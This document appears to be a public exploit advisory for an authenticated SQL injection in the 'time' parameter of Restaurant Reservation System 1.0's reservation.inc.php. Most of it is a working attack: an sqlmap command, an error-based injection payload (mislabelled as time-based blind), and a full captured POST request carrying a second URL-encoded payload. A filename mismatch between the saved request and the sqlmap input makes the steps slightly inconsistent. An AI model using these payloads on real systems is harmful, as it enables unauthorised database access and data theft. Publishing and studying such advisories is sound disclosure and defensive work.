# Restaurant Reservation System 1.0 - 'time' SQL Injection (Authenticated)

1. Description:
----------------------

Restaurant Reservation System 1.0 allows SQL Injection via parameter 'time' in
/Restaurant-Reservation/includes/reservation.inc.php. Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.


2. Proof of Concept:
----------------------

In Burpsuite intercept the request from the affected page with
'time' parameter and save it like re.req. Then run SQLmap to extract the
data from the database:

sqlmap -r poc.txt --dbms=mysql


3. Example payload:
----------------------

(time-based blind)

time=test' AND (SELECT 2640 FROM(SELECT COUNT(*),CONCAT(0x7162787171,(SELECT (ELT(2640=2640,1))),0x71786a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OYfG&lname=Test&fname=Test&date=01/01/2011&reserv-submit=3&tele=5234534558&comments=3&num_guests=1

4. Burpsuite request:
----------------------

POST /Restaurant-Reservation/includes/reservation.inc.php HTTP/1.1<br>
Host: localhost<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-us,en;q=0.5<br>
Cache-Control: no-cache<br>
Content-Length: 392<br>
Content-Type: application/x-www-form-urlencoded<br>
Cookie: PHPSESSID=gtouicsq43toq6jhs0tcs7ecq2<br>
Referer: http://localhost/Restaurant-Reservation/reservation.php<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36<br>
<br>
time=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&lname=Test&fname=Test&date=01%2f01%2f2011&reserv-submit=3&tele=5234534558&comments=3&num_guests=1
